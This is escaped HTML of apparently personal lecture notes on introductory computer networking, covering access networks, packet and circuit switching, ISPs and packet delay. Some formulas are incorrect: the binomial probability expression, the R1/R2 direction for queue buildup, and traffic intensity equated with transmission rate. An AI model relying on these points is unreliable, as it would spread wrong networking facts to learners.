        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Infrastructure that provides services to applications
&lt;ul&gt;
&lt;li&gt;web, streaming video, teleconferencing, email, games&lt;/li&gt;
&lt;li&gt;Examples: HTTP, Skype&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Provides programming interface to distribute applications
&lt;ul&gt;
&lt;li&gt;hooks apps to send/receive&lt;/li&gt;
&lt;li&gt;provides service options (like postal service)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;the-internet&#34; &gt;The Internet
&lt;span&gt;
    &lt;a href=&#34;#the-internet&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;protocols are everywhere
&lt;ul&gt;
&lt;li&gt;controls sending and receiving of messages&lt;/li&gt;
&lt;li&gt;e.g. HTTP (Web), streaming video, skype, TCP, IP, WiFi, 4G, Ethernet, bittorrent&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Internet standards
&lt;ul&gt;
&lt;li&gt;RFC: Request for COmments&lt;/li&gt;
&lt;li&gt;IETF: Internet Engineering Task Force&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;what-is-a-protocol&#34; &gt;What is a Protocol
&lt;span&gt;
    &lt;a href=&#34;#what-is-a-protocol&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Human: what&amp;rsquo;s the time, I have a question&lt;/li&gt;
&lt;li&gt;Network protocols: devices rather than humans (governs internet communications)&lt;/li&gt;
&lt;li&gt;Human: has conversation with someone&lt;/li&gt;
&lt;li&gt;Networks:
&lt;ul&gt;
&lt;li&gt;A-to-B: TCP connection request&lt;/li&gt;
&lt;li&gt;B-to-A: TCP connection response&lt;/li&gt;
&lt;li&gt;A-to-B: &lt;code&gt;GET http://gaia.cs.umass.edu/kurose_ross&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;B-to-A: &lt;code&gt;&amp;lt;file&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;hosts-on-the-internet&#34; &gt;Hosts on the Internet
&lt;span&gt;
    &lt;a href=&#34;#hosts-on-the-internet&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;network edge:
&lt;ul&gt;
&lt;li&gt;either clients or servers&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;access networks, physical media
&lt;ul&gt;
&lt;li&gt;access points (WiFi) connect to a switch (modem?)&lt;/li&gt;
&lt;li&gt;then the switches connect to routers to form a network&lt;/li&gt;
&lt;li&gt;then there&amp;rsquo;s a router that connects outside the network&lt;/li&gt;
&lt;li&gt;wired, wireless communication links&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;access-networks-tv-cable-based-access&#34; &gt;Access Networks: TV Cable-based Access
&lt;span&gt;
    &lt;a href=&#34;#access-networks-tv-cable-based-access&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;frequency division multiplexing (FDM): different channels transmitted in different frequency bands
&lt;ul&gt;
&lt;li&gt;splitter to split the channels into TV and cable modem&lt;/li&gt;
&lt;li&gt;channels for video, data (downstream and upstream), and control&lt;/li&gt;
&lt;li&gt;Physics!&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Hybrid fiber coax (HFC)
&lt;ul&gt;
&lt;li&gt;asymmetric: up to 40Mbps - 1.2Gbps downstream, 30-100 Mbps upstream&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;data is with packets with a source and a destination (ip addresses)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;digital-subscriber-line-dsl&#34; &gt;Digital Subscriber Line (DSL)
&lt;span&gt;
    &lt;a href=&#34;#digital-subscriber-line-dsl&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;On top of telephone network&lt;/li&gt;
&lt;li&gt;Before DSL, it was dial-up modems&lt;/li&gt;
&lt;li&gt;DSL access multiplexer (DSLAM)&lt;/li&gt;
&lt;li&gt;Need a splitter to split the data into Telephone and DSL modem&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;wireless-access-networks&#34; &gt;Wireless Access Networks
&lt;span&gt;
    &lt;a href=&#34;#wireless-access-networks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Wireless local area networks (WLANs)
&lt;ul&gt;
&lt;li&gt;Within or around building&lt;/li&gt;
&lt;li&gt;802.11b/g/n (WiFi): 11, 54, 450 mbps&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Wide-area cellular access networks
&lt;ul&gt;
&lt;li&gt;10mbps&lt;/li&gt;
&lt;li&gt;4G, 5G&lt;/li&gt;
&lt;li&gt;cellular network operator&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;institutional-networks&#34; &gt;Institutional Networks
&lt;span&gt;
    &lt;a href=&#34;#institutional-networks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;As mentioned before, in an institutional network, we have lots of access points in each building, and they all connect to switches which connect to distribution routers (routers in buildings) which connect to core routers which connect to edge routers which connect to at least one ISP.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://ns-info.uwaterloo.ca/netstats/core.php&#34;&gt;UWaterloo Core Network Statistics&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://ns-info.uwaterloo.ca/netstats/building.php&#34;&gt;UWaterloo Building Network Statistics&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;router-versus-switches&#34; &gt;Router Versus Switches
&lt;span&gt;
    &lt;a href=&#34;#router-versus-switches&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;If two networks use different technologies, we need to use routers, which is a switch with more capabilities.&lt;/p&gt;
&lt;h3 id=&#34;access-networks-data-center-networks&#34; &gt;Access Networks: Data Center Networks
&lt;span&gt;
    &lt;a href=&#34;#access-networks-data-center-networks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;high-bandwidth links (10s to 100s Gbps)&lt;/li&gt;
&lt;li&gt;connect hundreds to thousands of servers together, and to internet&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;hosts-send-packets-of-data&#34; &gt;Hosts Send Packets of Data
&lt;span&gt;
    &lt;a href=&#34;#hosts-send-packets-of-data&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;packet-switching: application messages is broken into smaller chunks (packets) of length &lt;em&gt;L&lt;/em&gt; bits&lt;/li&gt;
&lt;li&gt;transmits packet into access network at transmission rate &lt;em&gt;R&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Link transmission rate is the capacity (link bandwidth)&lt;/li&gt;
&lt;li&gt;packet transmission delay = time needed to transmit L-bit packet into link = L (bits) / R (bits per second)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;physical-media-links&#34; &gt;Physical Media Links
&lt;span&gt;
    &lt;a href=&#34;#physical-media-links&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;coaxial cable
&lt;ul&gt;
&lt;li&gt;two concentric copper conductors&lt;/li&gt;
&lt;li&gt;broadbands (100&amp;rsquo;s Mbps per channel, multiple frequency channels)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;fiber optic cable
&lt;ul&gt;
&lt;li&gt;glass fiber carrying light pulses, each pulse is a bit&lt;/li&gt;
&lt;li&gt;high-speed operation: high-speed point-to-point (10s-100s Gbps)&lt;/li&gt;
&lt;li&gt;low error rate: repeaters spaced far part, immune to electromagnetic noise&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;wireless radio
&lt;ul&gt;
&lt;li&gt;bands&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;radio link types
&lt;ul&gt;
&lt;li&gt;Wireless LAN (WiFi)&lt;/li&gt;
&lt;li&gt;Bluetooth: cable replacement&lt;/li&gt;
&lt;li&gt;terrestrial microwave&lt;/li&gt;
&lt;li&gt;satellite&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;the-network-core&#34; &gt;The Network Core
&lt;span&gt;
    &lt;a href=&#34;#the-network-core&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;network forwards packets from one router to the next, across links on path from source to destination&lt;/li&gt;
&lt;li&gt;forwarding (switching)
&lt;ul&gt;
&lt;li&gt;move arriving packet from input link to appropriate output link (each router has many output ports). &lt;a href=&#34;https://www.cisco.com/c/en/us/products/collateral/switches/catalyst-2960-x-series-switches/datasheet_c78-728232.html&#34;&gt;Example&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Run a routing algorithm/protocol on the routers
&lt;ul&gt;
&lt;li&gt;It will end up deciding what the best output port is for linking&lt;/li&gt;
&lt;li&gt;creates the forwarding table
&lt;ul&gt;
&lt;li&gt;packet header has an address&lt;/li&gt;
&lt;li&gt;forwarding table has a mapping of header value to output link&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;packet-switching-store-and-forward&#34; &gt;Packet Switching store-and-forward
&lt;span&gt;
    &lt;a href=&#34;#packet-switching-store-and-forward&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;takes L/R seconds to transmit L-bit packet into link at R bits per second&lt;/li&gt;
&lt;li&gt;entire packet must arrive at router before it can be transmitted on next link&lt;/li&gt;
&lt;li&gt;When R2 &amp;gt; R1, the router receives bits at a faster rate than it can handle
&lt;ul&gt;
&lt;li&gt;3rd packet: &lt;code&gt;t = 3L/R1 + L/R2&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;When R1 &amp;gt; R2,
&lt;ul&gt;
&lt;li&gt;3rd packet: &lt;code&gt;t = L/R1 + 3L/R2&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Finding out probability of users transmitting (binomial distributions):&lt;/p&gt;
&lt;p&gt;(users choose n) * p^n * p^(1 - n)&lt;/p&gt;
&lt;p&gt;For &amp;ldquo;at least 2&amp;rdquo; you can do 1 - P(n=1) - P(n = 0).&lt;/p&gt;
&lt;h3 id=&#34;packet-switching-queuing&#34; &gt;Packet Switching Queuing
&lt;span&gt;
    &lt;a href=&#34;#packet-switching-queuing&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;When R2 &amp;gt; R1, the queue fills because work arrives faster than it can service (transmission rate)&lt;/li&gt;
&lt;li&gt;packets are dropped if buffer is full (congestion)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;circuit-switching&#34; &gt;Circuit Switching
&lt;span&gt;
    &lt;a href=&#34;#circuit-switching&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;max users = link speed / required bandwidth&lt;/li&gt;
&lt;li&gt;end-to-end resources allocated to, researched for &amp;ldquo;call&amp;rdquo; between source and destination&lt;/li&gt;
&lt;li&gt;traditional telephone networks&lt;/li&gt;
&lt;li&gt;no sharing&lt;/li&gt;
&lt;li&gt;each link is split into sub-channels that can be used for circuits&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;time-division-multiplexing-tdm&#34; &gt;Time Division Multiplexing (TDM)
&lt;span&gt;
    &lt;a href=&#34;#time-division-multiplexing-tdm&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Alternatively to FDM where each call is allocated its own band, we can divide time into slots and each call is allocated a periodic slots that can transmit at the wide frequency band and so would get a higher rate&lt;/p&gt;
&lt;h3 id=&#34;network-of-networks&#34; &gt;Network of Networks
&lt;span&gt;
    &lt;a href=&#34;#network-of-networks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Impossible O(N^2) to connect all ISPs to all other ISPs so there are global ISPs that connect to each other global ISPs via an Internet Exchange Point and peering links. Regional ISPs will connect access nets to ISPs. Content provider networks (Google, Microsoft, Netflix) may connect directly to an IXP or beside a global ISP to be close to end users. Data centers, bypassing higher tier ISPs, more control over user experience, less money for sending traffic into provider networks, avoiding network discrimination.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.torix.ca/who-we-are/&#34;&gt;TORIX&lt;/a&gt;: Toronto Internet Exchange Point&lt;/p&gt;
&lt;h3 id=&#34;packet-delays-and-loss&#34; &gt;Packet Delays and Loss
&lt;span&gt;
    &lt;a href=&#34;#packet-delays-and-loss&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Packet delay is the sum of four sources&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Processing
&lt;ul&gt;
&lt;li&gt;Checking bit errors, determining output link (&amp;lt; microsecond)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Queueing
&lt;ul&gt;
&lt;li&gt;Waiting at output link&lt;/li&gt;
&lt;li&gt;Congestion&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Transmission
&lt;ul&gt;
&lt;li&gt;Time for packet until it is sent off (transmitted)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Propagation
&lt;ul&gt;
&lt;li&gt;Traveling to the next link takes time&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Packets have time-to-live which is a uint defining the max hops. If a router encounters a packet with a TTL of 1, it drops the packet and typically returns an error to the sender. Otherwise it propagates a packet with the TTL minus 1.&lt;/p&gt;
&lt;p&gt;Traffic intensity (I) = Transmission Rate = Packet Length * Average Packet Arrival Rate / Link Bandwidth = &lt;code&gt;La/R&lt;/code&gt; where L is packet length and R is transmission speed.&lt;/p&gt;
&lt;p&gt;Queueing Delay = I * L / R(1 - I)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Transmission Rate ~= 0: small delay&lt;/li&gt;
&lt;li&gt;Transmission Rate close to 1 but not larger: large delay&lt;/li&gt;
&lt;li&gt;Transmission Rate &amp;gt; 1: infinite delay due to more work than servicing&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;real-internet-delays&#34; &gt;Real Internet Delays
&lt;span&gt;
    &lt;a href=&#34;#real-internet-delays&#34;&gt;
